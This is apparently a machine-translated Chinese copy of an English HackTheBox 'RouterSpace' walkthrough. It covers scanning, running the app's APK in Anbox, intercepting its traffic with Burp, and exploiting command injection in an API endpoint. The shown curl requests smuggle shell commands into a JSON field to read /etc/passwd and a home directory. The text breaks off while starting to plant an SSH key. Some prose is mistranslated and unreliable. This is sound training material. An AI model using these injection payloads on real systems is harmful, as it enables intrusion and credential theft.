<html>
<head>
<title>RouterSpace from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的RouterSpace详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/routerspace-from-hackthebox-detailed-walkthrough-d40c22ad9d7c?source=collection_archive---------3-----------------------#2022-07-09">https://infosecwriteups.com/routerspace-from-hackthebox-detailed-walkthrough-d40c22ad9d7c?source=collection_archive---------3-----------------------#2022-07-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d0dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向您展示完成盒子所需的所有工具和技术。</p><p id="42b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://www.hackthebox.com/home/machines/profile/444" rel="noopener ugc nofollow" target="_blank"> RouterSpace </a>是由<a class="ae kl" href="https://www.hackthebox.com/home/users/profile/550483" rel="noopener ugc nofollow" target="_blank"> h4rithd </a>在<a class="ae kl" href="https://www.hackthebox.com/home" rel="noopener ugc nofollow" target="_blank"> HackTheBox </a>上制作的一款简易水平仪。这个Linux盒子侧重于web app和OS枚举，并使用SQLMap来转储数据。</p><h1 id="1d58" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">机器信息</h1><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/4f8e48476bdeda37a7d7bbc8e295083d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*pJT6vmy9r8h-msBJ.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">黑客盒子的路由器空间</figcaption></figure><p id="1954" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们从最初的网站上找到的apk开始。我们在Kali上使用Anbox来模拟Android设备，这样我们就可以在apk运行时与之交互。打嗝帮助我们找到一个地址和一个代理，让我们与应用程序互动。我们找到了一种远程执行代码的方法，让我们获得对机器的ssh访问，然后我们使用Baron same dit(CVE 2021–3156)漏洞获取root。</p><div class="lw lx gp gr ly lz"><a href="https://www.hackthebox.com/home/machines/profile/444" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">RouterSpace —破解盒子::渗透测试实验室</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.hackthebox.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn lq lz"/></div></div></a></div><h1 id="f03f" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">初步侦察</h1><p id="585c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="1fdd" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.148 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)<br/><br/>┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# nmap -p$ports -sC -sV -oA routerspace 10.10.11.148<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 17:03 EDT<br/>Nmap scan report for 10.10.11.148<br/>Host is up (0.11s latency).<br/><br/>PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     (protocol 2.0)<br/>| fingerprint-strings: <br/>|   NULL: <br/>|_    SSH-2.0-RouterSpace Packet Filtering V1<br/>| ssh-hostkey: <br/>|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)<br/>|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)<br/>|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)<br/>80/tcp open  http<br/>| fingerprint-strings: <br/>|   FourOhFourRequest: <br/>|     HTTP/1.1 200 OK<br/>|     X-Powered-By: RouterSpace<br/>|     X-Cdn: RouterSpace-58343<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 70<br/>|     ETag: W/"46-Qhj36TEqDHhoIimlameRlpAHdCU"<br/>|     Date: Wed, 13 Apr 2022 21:03:50 GMT<br/>|     Connection: close<br/>|     Suspicious activity detected !!!<br/>|   GetRequest: <br/>|     HTTP/1.1 200 OK<br/>|     X-Powered-By: RouterSpace<br/>|     X-Cdn: RouterSpace-3904<br/>|     Accept-Ranges: bytes<br/>|     Cache-Control: public, max-age=0<br/>|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT<br/>|     ETag: W/"652c-17d476c9285"<br/>|     Content-Type: text/html; charset=UTF-8<br/>|     Content-Length: 25900<br/>|     Date: Wed, 13 Apr 2022 21:03:49 GMT<br/>|     Connection: close<br/>|   RTSPRequest, X11Probe: <br/>|     HTTP/1.1 400 Bad Request<br/>|_    Connection: close<br/>|_http-title: RouterSpace<br/>|_http-trane-info: Problem with XML parsing of /evox/about<br/>&lt;SNIP&gt;<br/><br/>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds</span></pre><p id="3e66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们发现只有两个端口是开放的，22 (SSH)可能是为了以后，所以现在只有端口80。让我们来看看:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nd"><img src="../Images/9ddd9b39bda06eaaa17d5d07bec5824d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*OmTTW2x_oAVUVB8V.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">RouterSpace网站</figcaption></figure><h1 id="101d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">APK文件</h1><p id="11a3" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">就是一个无所事事的静态网站。只是一个下载apk的链接，让我们抓住它:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="747a" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# wget http://10.10.11.148/RouterSpace.apk<br/>--2022-04-13 17:14:19--  http://10.10.11.148/RouterSpace.apk<br/>Connecting to 10.10.11.148:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 35855082 (34M) [application/vnd.android.package-archive]<br/>Saving to: ‘RouterSpace.apk’<br/>RouterSpace.apk    100%[================&gt;] 34.19M 1.78MB/s in 22s     <br/><br/>2022-04-13 17:14:41 (1.53 MB/s) - ‘RouterSpace.apk’ saved [35855082/35855082]</span></pre><h1 id="f8b0" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Anbox配置</h1><p id="0db7" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们有一个Android应用程序(apk)文件，现在我们需要一种运行它的方法。要做到这一点，有几个选项，但为了简单起见，我们可以使用Kali repo中的Anbox。</p><p id="453a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先检查lxc是否已安装并且是最新的:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="a35b" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~]<br/>└─# apt-get install lxc<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  arch-test bridge-utils busybox-static cloud-image-utils debootstrap distro-info fakechroot <br/>  gcc-12-base genisoimage ibverbs-providers libboost-iostreams1.74.0 libboost-thread1.74.0<br/>&lt;SNIP&gt;<br/>1 upgraded, 35 newly installed, 1 to remove and 826 not upgraded.<br/>Need to get 26.9 MB of archives.<br/>After this operation, 81.1 MB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>Get:1 http://http.kali.org/kali kali-rolling/main amd64 busybox-static amd64 1:1.30.1-7+b2 [896 kB]<br/>Get:2 http://http.kali.org/kali kali-rolling/main amd64 uuid-runtime amd64 2.37.3-1+b1 [104 kB]<br/>Get:3 http://kali.download/kali kali-rolling/main amd64 gcc-12-base amd64 12-20220319-1 [206 kB]<br/>Get:4 http://http.kali.org/kali kali-rolling/main amd64 libstdc++6 amd64 12-20220319-1 [617 kB]<br/>&lt;SNIP&gt;<br/>Fetched 26.9 MB in 5s (5,944 kB/s)<br/>Extracting templates from packages: 100%<br/>Preconfiguring packages ...<br/>dpkg: busybox: dependency problems, but removing anyway as you requested:<br/> cryptsetup-initramfs depends on busybox | busybox-static; however:<br/>  Package busybox is to be removed.<br/>  Package busybox-static is not installed.<br/>&lt;SNIP&gt;<br/>Unpacking lxc-templates (3.0.4-5) ...<br/>Selecting previously unselected package lxcfs.<br/>Preparing to unpack .../28-lxcfs_5.0.0-1_amd64.deb ...<br/>Unpacking lxcfs (5.0.0-1) ...<br/>Done.<br/>&lt;SNIP&gt;<br/>Setting up qemu-utils (1:6.2+dfsg-2) ...<br/>Setting up arch-test (0.18-1) ...<br/>Setting up libgfxdr0:amd64 (10.1-1+b1) ...<br/>update-initramfs: Generating /boot/initrd.img-5.15.0-kali3-amd64<br/>Processing triggers for libc-bin (2.33-1) ...<br/>Processing triggers for man-db (2.9.4-4) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="a26d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个很长的安装，所以我已经削减了大部分。lxc排序后，让我们安装一个anbox:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="38f3" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~]<br/>└─# apt-get install anbox<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  libboost-filesystem1.74.0 libboost-log1.74.0 libboost-program-options1.74.0 libboost-regex1.74.0 libgles2 libprotobuf-lite23 libsdbus-c++1 libsdl2-image-2.0-0 libwebp7<br/>The following NEW packages will be installed:<br/>  anbox libboost-filesystem1.74.0 libboost-log1.74.0 libboost-program-options1.74.0 libboost-regex1.74.0 libgles2 libprotobuf-lite23 libsdbus-c++1 libsdl2-image-2.0-0 libwebp7<br/>0 upgraded, 10 newly installed, 0 to remove and 826 not upgraded.<br/>Need to get 3,183 kB of archives.<br/>After this operation, 16.2 MB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>Get:1 http://kali.download/kali kali-rolling/main amd64 libgles2 amd64 1.4.0-1 [18.2 kB]<br/>&lt;SNIP&gt;<br/>Get:10 http://http.kali.org/kali kali-rolling/contrib amd64 anbox amd64 0.0~git20211020-2 [754 kB]<br/>Fetched 3,183 kB in 1s (2,149 kB/s)<br/>&lt;SNIP&gt;<br/>Setting up anbox (0.0~git20211020-2) ...<br/>Created symlink /etc/systemd/user/default.target.wants/anbox-session-manager.service → /usr/lib/systemd/user/anbox-session-manager.service.<br/>Processing triggers for kali-menu (2021.4.2) ...<br/>Processing triggers for desktop-file-utils (0.26-1) ...<br/>Processing triggers for libc-bin (2.33-1) ...<br/>Processing triggers for man-db (2.9.4-4) ...<br/>Processing triggers for mailcap (3.70+nmu1) ...</span></pre><p id="c3ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要下载一个Android图像:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="fb8b" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~]<br/>└─# wget https://build.anbox.io/android-images/2018/07/19/android_amd64.img<br/>--2022-04-12 17:38:09--  https://build.anbox.io/android-images/2018/07/19/android_amd64.img<br/>Resolving build.anbox.io (build.anbox.io)... 163.172.154.175<br/>Connecting to build.anbox.io (build.anbox.io)|163.172.154.175|:443... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 325902336 (311M)<br/>Saving to: ‘android_amd64.img’<br/>android_amd64.img  100%[==============&gt;] 310.80M 25.3MB/s in 20s     <br/>2022-04-12 17:38:29 (15.5 MB/s) - ‘android_amd64.img’ saved [325902336/325902336]</span></pre><p id="65e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这需要移动到anbox文件夹:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="06b2" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~]<br/>└─# mv android_amd64.img /var/lib/anbox/android.img</span></pre><p id="3089" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们需要启动anbox容器服务:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="8654" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~]<br/>└─# systemctl start anbox-container-manager.service</span></pre><p id="e7d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到桌面，你会在应用程序菜单中找到一个框。点按它以打开应用程序管理器:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/89c0100bf91cd1b18d342d9c1ffcf85e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/0*4xW4lL-TPpfZr5J_.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Anbox应用程序经理</figcaption></figure><h1 id="699b" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">安装APK</h1><p id="9f71" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">运行之后，我们现在可以安装apk文件了:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="361f" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# adb install RouterSpace.apk<br/>Command 'adb' not found, but can be installed with:<br/>apt install adb<br/>Do you want to install it? (N/y)y<br/>apt install adb<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  android-sdk-platform-tools-common<br/>The following NEW packages will be installed:<br/>  adb android-sdk-platform-tools-common<br/>0 upgraded, 2 newly installed, 0 to remove and 826 not upgraded.<br/>Need to get 608 kB of archives.<br/>After this operation, 1,835 kB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>Get:1 http://kali.download/kali kali-rolling/main amd64 adb amd64 1:29.0.6-6 [599 kB]<br/>Get:2 http://http.kali.org/kali kali-rolling/main amd64 android-sdk-platform-tools-common all 28.0.2+7 [8,276 B]<br/>Fetched 608 kB in 1s (968 kB/s)                         <br/>Selecting previously unselected package adb.<br/>Preparing to unpack .../adb_1%3a29.0.6-6_amd64.deb ...<br/>Unpacking adb (1:29.0.6-6) ...<br/>Preparing to unpack .../android-sdk-platform-tools-common_28.0.2+7_all.deb ...<br/>Unpacking android-sdk-platform-tools-common (28.0.2+7) ...<br/>Setting up android-sdk-platform-tools-common (28.0.2+7) ...<br/>Setting up adb (1:29.0.6-6) ...<br/>Processing triggers for man-db (2.9.4-4) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="e797" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Adb和其他需要安装的工具。现在他们在那里，我们可以再试一次:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="1638" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# adb install RouterSpace.apk<br/>* daemon not running; starting now at tcp:5037<br/>* daemon started successfully<br/>error: device offline<br/>Performing Push Install<br/>adb: error: failed to get feature set: device offline</span></pre><p id="5446" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一次我们得到一个错误，因为守护进程没有运行。它会自动启动，所以只需再次运行该命令:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="ad29" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# adb install RouterSpace.apk<br/>Performing Streamed Install<br/>Success</span></pre><h1 id="8479" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">运行应用程序</h1><p id="aea6" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">这次成功了，回头看看Anbox，我们看到我们的应用程序已经出现:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/8e52517ec5ce5352c1c98d7542743062.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/0*KxqrJSoB73kRUgV0.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Anbox中的RouterSpace应用</figcaption></figure><p id="64be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行应用程序时，我们会看到这个页面:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nk"><img src="../Images/3f8dead6074a2b85a0debc58408e3364.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8_RAAucH4mJxMejO.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">RouterSpace应用程序检查状态</figcaption></figure><p id="e99c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击检查状态按钮会给我们一个错误:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/8c2787f146eabe720e830d252eb9a217.png" data-original-src="https://miro.medium.com/v2/resize:fit:830/format:webp/0*NydwG22soTUwD_SF.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">检查状态错误消息</figcaption></figure><h1 id="92bf" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">ADB代理配置</h1><p id="e015" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们看不到应用程序试图去哪里，也没有办法在Anbox上设置代理，但快速搜索发现了这个向我们展示了如何从adb的命令行做到这一点。为此，我们只需这样做:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="46a7" class="my kn iq mu b gy mz na l nb nc">adb shell settings put global http_proxy &lt;host&gt;:&lt;port&gt;</span></pre><p id="e056" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们将添加http_proxy设置为指向Burp，那么我们可以捕获来自RouterSpace应用程序的流量:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="5407" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# adb shell settings put global http_proxy 10.10.14.124:4444</span></pre><h1 id="8d9d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">打嗝截击</h1><p id="f52f" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">现在启动Burp并转到代理部分的选项选项卡:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/cb0826dcccf8ebfc3c524733630365cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/0*EKe6oM9hwFLMioMZ.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">设置Burp代理监听器</figcaption></figure><p id="45ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">添加一个新的代理侦听器，并将其绑定到我们的tun0地址，其端口与我们在上面为adb http_proxy设置的端口相同:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/fa95717f231970b8f0300fc03c04babf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/0*ywO1La31xTvQ_df9.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">为端口4444添加绑定</figcaption></figure><p id="bbc7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">添加时应该是这样的:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nk"><img src="../Images/f4c6e620f45ab3a3eafee7539fc37e6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*alS79HwjKlN8bXIB.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">现在配置了新的代理监听程序</figcaption></figure><p id="ce68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到RouterSpace应用程序，再次单击Check Status，现在回到Burp，查看它截获的请求:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi no"><img src="../Images/4de7634ba71027976045abd9dad5645e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1118/format:webp/0*8SUvzO4sr5jB16F0.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Burp截获了来自RouterSpace应用程序的请求</figcaption></figure><p id="7610" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以把它发送到复读机去玩:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi np"><img src="../Images/fe4617032bf4abd1ad9eb144169bf776.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*imDbEark3ispYVp2.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">使用打嗝复读机进行调查</figcaption></figure><h1 id="b5e8" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">对RCE使用Curl</h1><p id="5695" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">找到端点后，我们现在不需要Anbox了，没有它也可以继续探索。我更喜欢使用命令行，这样我们可以使用curl而不是Burp:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="23e9" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess<br/><br/>"0.0.0.0\n"</span></pre><p id="fbd2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">玩了一圈后，我发现我们可以用a；在0.0.0.0之后运行我们选择的命令。这里我显示了passwd文件，并使用sed/cut使它显示得很好:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="88ca" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;cat /etc/passwd\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess &gt; /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p' | grep /bin/bash<br/>root:x:0:0:root:/root:/bin/bash<br/>paul:x:1001:1001:,,,:/home/paul:/bin/bash</span></pre><p id="5e79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只有Paul和root可以登录。让我们看看保罗的个人文件夹:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="a061" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;ls -lsa /home/paul\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess &gt; /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p'                 <br/>total 48<br/>4 drwxr-xr-x 8 paul paul 4096 Feb 17 18:30 .<br/>4 drwxr-xr-x 3 root root 4096 Feb 17 18:30 ..<br/>0 lrwxrwxrwx 1 root root    9 Nov 20 19:32 .bash_history -&gt; /dev/null<br/>4 -rw-r--r-- 1 paul paul  220 Nov 20 17:32 .bash_logout<br/>4 -rw-r--r-- 1 paul paul 3771 Nov 20 17:32 .bashrc<br/>4 drwx------ 2 paul paul 4096 Feb 17 18:30 .cache<br/>4 drwx------ 3 paul paul 4096 Apr 19 20:01 .gnupg<br/>4 drwxrwxr-x 3 paul paul 4096 Feb 17 18:30 .local<br/>4 drwxrwxr-x 5 paul paul 4096 Apr 19 17:24 .pm2<br/>4 -rw-r--r-- 1 paul paul  823 Nov 20 18:30 .profile<br/>4 drwxr-xr-x 3 paul paul 4096 Feb 17 18:30 snap<br/>4 drwx------ 2 paul paul 4096 Apr 19 19:46 .ssh<br/>4 -r--r----- 1 root paul   33 Apr 19 17:25 user.txt</span></pre><h1 id="dcfb" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">用户标志</h1><p id="3dc9" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们可以获取用户标志:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="ffe6" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;cat /home/paul/user.txt\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess &gt; /dev/null | sed 's/\\n/\n/g' | cut -d '"' -f 2 | sed -n '1!p' <br/>1883f666c7b2ac1683e666225a372ce7</span></pre><h1 id="4c99" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">反向外壳</h1><p id="4872" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">是时候反转外壳了。我们可以像在<a class="ae kl" href="https://pencer.io/ctf/ctf-htb-horizontall/" rel="noopener ugc nofollow" target="_blank">horizontal</a>上那样做。首先生成一个ssh密钥对:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="4ffd" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# ssh-keygen                                      <br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/routerspace/id_rsa<br/>Enter passphrase (empty for no passphrase): <br/>Enter same passphrase again: <br/>Your identification has been saved in /root/htb/routerspace/id_rsa<br/>Your public key has been saved in /root/htb/routerspace/id_rsa.pub<br/>The key fingerprint is:<br/>SHA256:Z+wQ9wrHt+p7f6aOv/tAol77FCQ36P28umPKNnhPu24 root@kali<br/>The keys randomart image is:<br/>+---[RSA 3072]----+<br/>|                 |<br/>|             .   |<br/>|        . . o +  |<br/>|         = o = . |<br/>|        S * = +  |<br/>|         B + + + |<br/>|          = o.o o|<br/>|         o.*oE..+|<br/>|         .B=X%&amp;O.|<br/>+----[SHA256]-----+</span></pre><p id="3e92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以将其回显到机器上的authorized_keys文件中:</p><pre class="ll lm ln lo gt mt mu mv mw 